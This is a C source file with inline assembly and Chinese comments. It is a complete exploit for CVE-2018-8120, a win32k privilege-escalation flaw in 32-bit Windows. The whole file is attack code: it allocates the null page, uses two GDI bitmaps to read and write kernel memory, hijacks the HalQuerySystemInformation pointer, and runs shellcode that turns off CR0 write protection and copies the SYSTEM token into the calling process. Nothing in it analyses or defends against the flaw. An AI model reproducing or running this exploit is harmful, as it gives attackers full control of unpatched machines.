#include "CVE-2018-8120.h"

BOOL __declspec(naked) CallNtUserSetImeInfoEx(PVOID arg0)
{
	__asm
	{
		mov esi, arg0
		mov eax, 0x1226			// NtUserSetImeInfoEx的调用号
		mov edx, 0x7FFE0300
		call dword ptr[edx]
		ret 4
	}
}

BOOL Exploit_CVE_2018_8120()
{
	BOOL bRet = TRUE;
	char szBuf[0x15C] = { 0 };
	
	if (!Init_CVE_2018_8120())
	{
		bRet = FALSE;
		goto exit;
	}

	if (!Trigger_CVE_2018_8120())
	{
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

BOOL Trigger_CVE_2018_8120()
{
	BOOL bRet = TRUE;
	HBITMAP hManger = NULL, hWorker = NULL;
	DWORD dwBuf[0x60] = { 0x90 };
	PVOID mpv = NULL, wpv = NULL;
	PVOID pOrgAddr = NULL;
	PVOID pTargetAddr = (PVOID)ShellCode_CVE_2018_8120;

	// 0地址分配内存
	if (!AllocateZeroMemory())
	{
		bRet = FALSE;
		goto exit;
	}

	hManger = CreateBitmap(0x60, 1, 1, 32, dwBuf);
	hWorker = CreateBitmap(0x60, 1, 1, 32, dwBuf);

	if (!hManger || !hWorker)
	{
		ShowError("CreateBitmap", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	mpv = GetPvScan(hManger);
	wpv = GetPvScan(hWorker);

	// 指定被写入的地址
	*(PDWORD)(0x2C) = (DWORD)mpv;
	// 绕过while循环的验证
	*(PDWORD)(0x14) = (DWORD)wpv;
	
	DWORD szBuf[0x15C / sizeof(DWORD)] = { 0 };

	// 指定要写入的内容
	szBuf[0] = (DWORD)wpv;
	szBuf[1] = 0x180;
	szBuf[2] = 0x1D95;
	szBuf[3] = 6;
	szBuf[4] = 0x10000;
	szBuf[5] = 0x0;
	szBuf[6] = 0x4800200;
	// 触发漏洞
	if (!CallNtUserSetImeInfoEx(szBuf))
	{
		ShowError("CallNtUserSetImeInfoEx", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	// 获取保存HalQuerySystemInformation函数地址的地址
	PVOID pHalQuerySystemInformation = GetHalQuerySystemInformation();
	if (!pHalQuerySystemInformation)
	{
		bRet = FALSE;
		goto exit;
	}

	// 设置hManger的可修改地址为保存HalQuerySystemInformation函数地址的地址
	SetBitmapBits(hManger, sizeof(PVOID), &pHalQuerySystemInformation);  
	// 获取可修改的地址中的内容
	GetBitmapBits(hWorker, sizeof(PVOID), &pOrgAddr);	
	// 将可修改地址中的值修改为ShellCode地址
	SetBitmapBits(hWorker, sizeof(PVOID), &pTargetAddr);	
	
	// 调用NtQueryIntervalProfile，执行ShellCode
	if (!CallNtQueryIntervalProfile())
	{
		bRet = FALSE;
		goto exit;
	}

	// 将可修改地址中的内容恢复回去
	SetBitmapBits(hWorker, sizeof(PVOID), &pOrgAddr);
exit:
	return bRet;
}

PVOID GetPvScan(HBITMAP hBitHandle)
{
	DWORD dwGdiCellArray = GetGdiCellArray();

	PGDICELL pGdiCell = (PGDICELL)(dwGdiCellArray + LOWORD(hBitHandle) * sizeof(GDICELL));
	
	return (PVOID)((DWORD)pGdiCell->pKernelAddress + 0x30);
}

DWORD GetGdiCellArray()
{
	__asm
	{
		mov eax, fs:[0x30]			// eax = PEB
		mov eax, [eax + 0x94]		// eax = GDICELL数组首地址
	}
}

BOOL Init_CVE_2018_8120()
{
	BOOL bRet = TRUE;
	HWINSTA hSta = NULL;

	hSta = CreateWindowStation(NULL, 0, READ_CONTROL, NULL);
	if (hSta == NULL)
	{
		ShowError("CreateWindowStation", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	if (!SetProcessWindowStation(hSta))
	{
		ShowError("SetProcessWindowStation", GetLastError());
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

BOOL POC_CVE_2018_8120()
{
	BOOL bRet = TRUE;
	HWINSTA hSta = NULL;

	// 创建tagWINDOWSTATION结构体
	hSta = CreateWindowStation(NULL, 0, READ_CONTROL, NULL);
	if (hSta == NULL)
	{
		ShowError("CreateWindowStation", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	// 将创建的结构体设置到本进程中
	if (!SetProcessWindowStation(hSta))
	{
		ShowError("SetProcessWindowStation", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	char szBuf[0x15C] = { 0 };
	CallNtUserSetImeInfoEx((PVOID)szBuf);

exit:
	return bRet;
}

NTSTATUS ShellCode_CVE_2018_8120(ULONG InformationClass, ULONG BufferSize, PVOID Buffer, PULONG ReturnedLength)
{
	// 关闭页保护
	__asm
	{
		cli
		mov eax, cr0
		and eax, ~0x10000
		mov cr0, eax
	}

	__asm
	{
		// 取当前线程
		mov eax, fs:[0x124]
		// 取线程对应的EPROCESS
		mov esi, [eax + 0x150]
		mov eax, esi
	searchWin7:
		mov eax, [eax + 0xB8]
		sub eax, 0xB8
		mov edx, [eax + 0xB4]
		cmp edx, 0x4
		jne searchWin7
		mov eax, [eax + 0xF8]
		mov[esi + 0xF8], eax
	}

	// 开起页保护
	__asm
	{
		mov eax, cr0
		or eax, 0x10000
		mov cr0, eax
		sti
	}

	return STATUS_SUCCESS;
}
